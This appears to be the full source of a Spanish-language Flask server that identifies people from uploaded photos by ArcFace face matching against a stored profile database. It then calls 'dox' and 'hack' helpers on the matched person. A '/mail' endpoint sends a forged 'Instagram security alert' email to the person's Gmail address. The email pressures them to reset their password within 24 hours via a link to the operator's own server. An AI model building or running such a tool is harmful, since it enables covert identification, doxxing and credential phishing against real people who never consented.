import os
import sys
import uuid
import math
import time
import joblib
import numpy as np
from email.message import EmailMessage
import smtplib
from datetime import datetime
from typing import Dict, List, Tuple
from flask import Flask, request, jsonify
from deepface import DeepFace

import cv2
from PIL import Image, ImageEnhance, ImageOps

try:
    import database
except Exception:
    database = None

MODEL_FILE = "death_note.pkl"

MODEL_NAME = "ArcFace"
DETECTION_BACKENDS = ["retinaface", "mediapipe", "opencv"]

USE_AUGS = True
AUGS = [
    ("orig",       lambda im: im),
    ("rot+10",     lambda im: im.rotate(10,  expand=False)),
    ("rot-10",     lambda im: im.rotate(-10, expand=False)),
    ("mirror",     lambda im: ImageOps.mirror(im)),
    ("bright0.8",  lambda im: ImageEnhance.Brightness(im).enhance(0.8)),
    ("bright1.2",  lambda im: ImageEnhance.Brightness(im).enhance(1.2)),
]

SOFTMAX_TEMPERATURE = 0.25
LOW_CONFIDENCE_THRESHOLD = 0.35

SAVE_DIR = "scan"
os.makedirs(SAVE_DIR, exist_ok=True)

print(f"[✓] Cargando base de datos desde: {MODEL_FILE}")
_db_raw = joblib.load(MODEL_FILE)
print(f"[✓] Perfiles cargados: {len(_db_raw)}")

def _normalize_legacy(db: Dict[str, object]) -> Dict[str, Dict[str, object]]:
    """
    Soporta:
      - {'user': [emb512, ...]}  (legado -> mean, count=1)
      - {'user': {'mean': [emb512], 'count': N}}
    """
    normalized = {}
    for k, v in db.items():
        if isinstance(v, dict) and "mean" in v:
            mean = v["mean"]
            cnt = int(v.get("count", 1))
        else:
            mean = v
            cnt = 1
        mean = list(np.array(mean, dtype=np.float32).reshape(-1))
        if len(mean) != 512:
            continue
        normalized[k] = {"mean": mean, "count": cnt}
    return normalized

database_pkl = _normalize_legacy(_db_raw)

def l2_normalize(vec: np.ndarray) -> np.ndarray:
    n = np.linalg.norm(vec)
    return vec if n == 0 else vec / n

def cosine_sim(a: np.ndarray, b: np.ndarray) -> float:
    a = l2_normalize(a); b = l2_normalize(b)
    return float(np.dot(a, b))

def softmax(xs: List[float], temp: float = 1.0) -> List[float]:
    if not xs:
        return []
    m = max(xs)
    exps = [math.exp((x - m) / max(1e-6, temp)) for x in xs]
    s = sum(exps) or 1.0
    return [e / s for e in exps]

def short_id(n=6) -> str:
    return uuid.uuid4().hex[:n]

def conf_label(score: float) -> str:
    if score >= 0.90: return "EXTRAORDINARIA"
    if score >= 0.85: return "MUY ALTA"
    if score >= 0.75: return "ALTA"
    if score >= 0.65: return "MEDIA"
    return "BAJA"

def represent_image_robust(img_path: str):
    """
    Devuelve (embedding (512,), backend_usado (str|None), augs_ok (int)).
    Pasa PIL RGB -> OpenCV BGR cuando usa ndarray.
    """
    if not os.path.isfile(img_path):
        raise FileNotFoundError(f"No existe la imagen: {img_path}")

    im = Image.open(img_path).convert("RGB")
    embs: List[np.ndarray] = []
    used_backend = None
    augs_ok = 0

    augs = AUGS if USE_AUGS else [("orig", lambda im: im)]
    for _, aug_fn in augs:
        arr_rgb = np.array(aug_fn(im))
        arr_bgr = cv2.cvtColor(arr_rgb, cv2.COLOR_RGB2BGR)
        for backend in DETECTION_BACKENDS:
            try:
                res = DeepFace.represent(
                    img_path=arr_bgr,
                    model_name=MODEL_NAME,
                    detector_backend=backend,
                    enforce_detection=False
                )
                if res and "embedding" in res[0]:
                    e = np.array(res[0]["embedding"], dtype=np.float32)
                    if e.shape[0] == 512:
                        embs.append(e)
                        augs_ok += 1
                        if used_backend is None:
                            used_backend = backend
                        break
            except Exception:
                continue

    if not embs:
        return None, None, 0

    emb = np.mean(np.stack(embs, axis=0), axis=0)
    return l2_normalize(emb), used_backend, augs_ok

def rank_identities(model: Dict[str, Dict[str, object]], probe_emb: np.ndarray
                    ) -> Tuple[List[Tuple[str, float, int]], List[float]]:
    entries: List[Tuple[str, float, int]] = []
    for user, rec in model.items():
        mean = np.array(rec["mean"], dtype=np.float32)
        count = int(rec.get("count", 1))
        sim = cosine_sim(probe_emb, mean)
        entries.append((user, sim, count))
    entries.sort(key=lambda x: x[1], reverse=True)
    sims = [sim for _, sim, _ in entries]
    probs = softmax(sims, temp=SOFTMAX_TEMPERATURE)
    return entries, probs

def build_top_block(persona: str, score: float, backend: str, meta: dict) -> str:
    if persona is None:
        return "👤 Persona: ❌ No se pudo obtener embedding válido\n📊 Confianza: 0.00%\n"
    body = (
        f"👤 Persona: {persona}\n"
        f"📊 Confianza: {score:.2%}  ({conf_label(score)})\n"
        f"🧠 Backend: {backend or 'n/a'}  •  Dim: {meta.get('emb_dim','?')}\n"
        f"🗃️ DB: {meta.get('db_size','?')} perfiles  •  Checks: {meta.get('checks','?')}\n"
        f"⏱️ Proceso: {meta.get('ms','?')} ms\n"
    )
    return body

app = Flask(__name__)

@app.route("/mail", methods=["POST"])
def upload_data():
    msg = EmailMessage()
    p = request.form.get("persona")
    print(p)
    msg['Subject'] = 'Alerta de seguridad Instagram'
    msg['From'] = '' #La cuenta que quieras poner
    msg['To'] = p+'@gmail.com'
    msg.set_content('Se ha detectado un acceso no autorizado a tu cuenta de instagram @'+p+' dispones de 24 horas para reestablecer tu contraseña desde el siguiente enlace o podrías perder el acceso completo a tu cuenta: http://'+sys.argv[1]+'  Atentamente: equipo de Instagram')
    msg.add_alternative(
        "<!DOCTYPE html><html><body><p>Se ha detectado un acceso no autorizado a tu cuenta de instagram @"
        + p +
        "<br>Dispones de 24 horas para reestablecer tu contraseña desde el siguiente "
        "<a href='http://" + sys.argv[1] + "'>enlace</a>!</p></body></html>", subtype='html'
    )
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('user', 'pasw') #La cuenta que quieras poner (user:pasw)
        smtp.send_message(msg)
    return jsonify(ok=True, persona=p), 200

@app.route("/upload", methods=["POST"])
def upload_image():
    t0 = time.perf_counter()

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'unknown')

    ts = datetime.now().strftime("%H%M%S")
    fid = short_id(6)
    filename = f"{ts}_{fid}.jpg"
    filepath = os.path.join(SAVE_DIR, filename)
    raw = request.data or b""
    bytes_in = len(raw)
    with open(filepath, "wb") as f:
        f.write(raw)
    print(f"[✓] Imagen guardada: {filepath}")

    img = cv2.imread(filepath)
    if img is not None:
        h, w = img.shape[:2]
        resolution = f"{w}x{h}"
    else:
        resolution = "unknown"

    probe, backend, augs_ok = represent_image_robust(filepath)
    emb_dim = 512 if probe is not None else 0

    if probe is None:
        best_user = None
        best_score = 0.0
        ranked = []
        probs = []
        checks = 0
    else:
        ranked, probs = rank_identities(database_pkl, probe)
        checks = len(ranked)
        if ranked:
            (best_user, best_score, best_count) = ranked[0]
        else:
            best_user, best_score, best_count = None, 0.0, 0

    db_size = len(database_pkl)
    ms = int((time.perf_counter() - t0) * 1000)

    bloque_top = build_top_block(
        best_user, best_score, backend,
        meta={"emb_dim": emb_dim, "db_size": db_size, "checks": checks, "ms": ms}
    )

    web_str = ""
    pl_str = ""
    if database:
        try:
            web_str = str(database.dox(best_user)) if best_user else ""
        except Exception:
            web_str = ""
        try:
            pl_str = str(database.hack(best_user)) if best_user else ""
        except Exception:
            pl_str = ""

    if best_user:
        pct = probs[0]*100 if probs else 0.0
        print(f"[DETECTADO] {best_user}  (sim={best_score:.3f}  pct={pct:.2f}%)")
    else:
        print("[DETECTADO] ❌ No se pudo obtener embedding válido")

    resp = {
        "id": fid,
        "archivo": filename,
        "persona": best_user if best_user else "❌ No se pudo obtener embedding válido",
        "confianza": bloque_top,
        "nick": float(best_score),
        "conf_level": conf_label(best_score),
        "backend": backend or "n/a",
        "embedding_dim": emb_dim,
        "bytes": bytes_in,
        "resolution": resolution,
        "client_ip": client_ip,
        "user_agent": ua,
        "info": f"{best_user}\n",
        "web": web_str,
        "pl": pl_str,
        "se": "true",
        "processing_ms": ms
    }

    return jsonify(resp), 200

if __name__ == "__main__":
    n_users = len(database_pkl)
    total_imgs = sum(int(v.get("count", 1)) for v in database_pkl.values())
    app.run(host="0.0.0.0", port=5000)
